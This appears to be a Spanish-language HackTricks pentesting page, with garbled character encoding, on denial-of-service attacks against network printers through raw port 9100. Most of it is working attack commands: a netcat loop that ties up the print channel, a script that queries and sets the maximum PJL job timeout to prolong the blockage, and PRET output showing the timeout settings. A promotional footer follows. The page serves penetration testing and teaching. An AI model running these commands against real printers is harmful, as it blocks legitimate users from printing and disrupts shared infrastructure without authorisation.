Si los trabajos de impresiÃ³n se procesan en serie, lo que se asume para la mayorÃ­a de los dispositivos, solo se puede manejar un trabajo a la vez. Si este trabajo no termina, el canal de impresiÃ³n queda bloqueado hasta que se activa un tiempo de espera, lo que impide que los usuarios legÃ­timos impriman.

DoS bÃ¡sico:
```bash
while true; do nc printer 9100; done
```
Este ataque trivial de denegaciÃ³n de servicio puede mejorarse **configurando un valor alto de tiempo de espera con PJL**, de esta manera se minimiza el nÃºmero de conexiones que un atacante puede hacer, mientras que se hace aÃºn mÃ¡s difÃ­cil para los usuarios legÃ­timos obtener un espacio de tiempo libre:
```bash
# get maximum timeout value with PJL
MAX="`echo "@PJL INFO VARIABLES" | nc -w3 printer 9100 |\
  grep -E -A2 '^TIMEOUT=' | tail -n1 | awk '{print $1}'`"
# connect and set maximum timeout for current job with PJL
while true; do echo "@PJL SET TIMEOUT=$MAX" | nc printer 9100; done
```
Puedes usar [PRET](https://github.com/RUB-NDS/PRET) para encontrar la configuraciÃ³n de tiempo de espera:
```bash
./pret.py -q printer pjl
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> env timeout
TIMEOUT=15 [2 RANGE]
       5
       300
```
Mientras que la referencia PJL especifica un tiempo mÃ¡ximo de espera de 300 segundos, en la prÃ¡ctica los tiempos de espera mÃ¡ximos de PJL pueden variar de 15 a 2147483 segundos.\
Tenga en cuenta que incluso los trabajos de impresiÃ³n recibidos de otros canales de impresiÃ³n como IPP o LPD ya no se procesan siempre y cuando se mantenga abierta la conexiÃ³n.

**Obtenga mÃ¡s informaciÃ³n sobre este ataque en** [**http://hacking-printers.net/wiki/index.php/Transmission\_channel**](http://hacking-printers.net/wiki/index.php/Transmission\_channel)


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- Â¿Trabaja en una **empresa de ciberseguridad**? Â¿Quiere ver su **empresa anunciada en HackTricks**? Â¿O quiere tener acceso a la **Ãºltima versiÃ³n de PEASS o descargar HackTricks en PDF**? Â¡Consulte los [**PLANES DE SUSCRIPCIÃ“N**](https://github.com/sponsors/carlospolop)!

- Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecciÃ³n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenga el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)

- **Ãšnase al** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sÃ­game** en **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparta sus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
